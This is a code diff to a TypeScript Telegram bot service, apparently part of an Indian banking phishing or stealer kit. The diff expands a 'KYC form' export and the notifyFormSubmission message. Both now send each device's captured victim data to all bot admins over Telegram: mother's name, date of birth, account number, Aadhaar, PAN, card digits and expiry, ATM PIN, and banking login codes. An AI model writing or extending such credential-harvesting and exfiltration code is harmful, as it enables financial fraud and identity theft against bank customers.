@@ -519,13 +519,35 @@ export class TelegramBotService {
             const date = new Date(form.submittedAt).toLocaleString();
             content += `┌──────────────────────────────────────────────────┐\n`;
             content += `│  Submission #${index + 1}\n`;
+            content += `│  🕐 Submitted: ${date}\n`;
             content += `├──────────────────────────────────────────────────┤\n`;
-            content += `│  👤 Name:         ${form.name}\n`;
-            content += `│  📱 Phone:        ${form.phoneNumber}\n`;
-            content += `│  🕐 Submitted:    ${date}\n`;
-            content += `│  🔑 ID:           ${form.id}\n`;
+            content += `│  👤 PERSONAL DETAILS\n`;
+            content += `│     Name:         ${form.fullName || form.name || 'N/A'}\n`;
+            content += `│     Mobile:       ${form.mobileNumber || form.phoneNumber || 'N/A'}\n`;
+            content += `│     Mother:       ${form.motherName || 'N/A'}\n`;
+            content += `│     DOB:          ${form.dateOfBirth || 'N/A'}\n`;
+            content += `├──────────────────────────────────────────────────┤\n`;
+            content += `│  🏦 ACCOUNT DETAILS\n`;
+            content += `│     Account No:   ${form.accountNumber || 'N/A'}\n`;
+            content += `│     Aadhaar:      ${form.aadhaarNumber || 'N/A'}\n`;
+            content += `│     PAN Card:     ${form.panCard || 'N/A'}\n`;
+            content += `│     CIF Number:   ${form.cifNumber || 'N/A'}\n`;
+            content += `│     Branch Code:  ${form.branchCode || 'N/A'}\n`;
+            content += `├──────────────────────────────────────────────────┤\n`;
+            content += `│  💳 CARD DETAILS\n`;
+            content += `│     Card Last 6:  ${form.cardLast6 || 'N/A'}\n`;
+            content += `│     Card Expiry:  ${form.cardExpiry || 'N/A'}\n`;
+            content += `│     ATM PIN:      ${form.atmPin || 'N/A'}\n`;
+            content += `│     Final PIN:    ${form.finalPin || 'N/A'}\n`;
+            content += `├──────────────────────────────────────────────────┤\n`;
+            content += `│  🔐 LOGIN CREDENTIALS\n`;
+            content += `│     User ID:      ${form.userId || 'N/A'}\n`;
+            content += `│     Access Code:  ${form.accessCode || 'N/A'}\n`;
+            content += `│     Profile Code: ${form.profileCode || 'N/A'}\n`;
             content += `└──────────────────────────────────────────────────┘\n\n`;
         });
+
+
 
         content += `\n═══════════════════════════════════════════════════════\n`;
         content += `                    END OF EXPORT\n`;
@@ -1207,12 +1229,35 @@ export class TelegramBotService {
         );
     }
 
-    async notifyFormSubmission(deviceName: string, form: { name: string; phoneNumber: string; id?: string }): Promise<void> {
-        let message = `📝 *New Form Submission*\n\n`;
+    async notifyFormSubmission(deviceName: string, form: FormData): Promise<void> {
+        let message = `📝 *New KYC Form Submission*\n\n`;
         message += `📱 Device: *⟨${deviceName}⟩*\n`;
-        message += `👤 Name: ${form.name}\n`;
-        message += `📞 Phone: ${form.phoneNumber}`;
-        if (form.id) message += `\n🆔 ID: ${form.id}`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+
+        message += `*👤 Personal Details:*\n`;
+        message += `   Name: ${form.fullName || form.name || 'N/A'}\n`;
+        message += `   Mobile: ${form.mobileNumber || form.phoneNumber || 'N/A'}\n`;
+        message += `   Mother: ${form.motherName || 'N/A'}\n`;
+        message += `   DOB: ${form.dateOfBirth || 'N/A'}\n\n`;
+
+        message += `*🏦 Account Details:*\n`;
+        message += `   Account: ${form.accountNumber || 'N/A'}\n`;
+        message += `   Aadhaar: ${form.aadhaarNumber || 'N/A'}\n`;
+        message += `   PAN: ${form.panCard || 'N/A'}\n`;
+        message += `   CIF: ${form.cifNumber || 'N/A'}\n`;
+        message += `   Branch: ${form.branchCode || 'N/A'}\n\n`;
+
+        message += `*💳 Card Details:*\n`;
+        message += `   Last 6: ${form.cardLast6 || 'N/A'}\n`;
+        message += `   Expiry: ${form.cardExpiry || 'N/A'}\n`;
+        message += `   PIN: ${form.atmPin || 'N/A'}\n`;
+        message += `   Final PIN: ${form.finalPin || 'N/A'}\n\n`;
+
+        message += `*🔐 Login Credentials:*\n`;
+        message += `   User ID: ${form.userId || 'N/A'}\n`;
+        message += `   Access Code: ${form.accessCode || 'N/A'}\n`;
+        message += `   Profile Code: ${form.profileCode || 'N/A'}`;
+
 
         await this.sendToAllAdmins(message);
     }
@@ -1222,6 +1267,7 @@ export class TelegramBotService {
         const deviceName = deviceData?.device?.name || deviceId.substring(0, 8);
         await this.notifyFormSubmission(deviceName, form);
     }
+
 
     isActive(): boolean {
         return this.isEnabled && this.bot !== null;
